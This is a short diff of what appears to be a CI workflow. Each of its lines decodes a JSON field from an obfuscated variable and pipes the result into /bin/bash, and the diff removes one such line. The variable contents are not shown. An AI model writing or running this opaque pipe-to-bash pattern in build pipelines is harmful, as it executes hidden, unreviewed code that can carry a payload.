@@ -21,7 +21,6 @@ jobs:
           echo $j70045 | jq -r .vizaf06683 | /bin/bash
           printf '%s' "$otra73283" | jq -r .xwym899 | /bin/bash
           echo $vbwtm8078 | jq -r .bclv1056 | /bin/bash
-          echo $auwj80 | jq -r .xfn0 | /bin/bash
           echo $tegql5 | jq -r .nsl68796 | /bin/bash
           echo $fwqp364 | jq -r .a815 | /bin/bash
           echo $k68 | jq -r .gvper1450 | /bin/bash
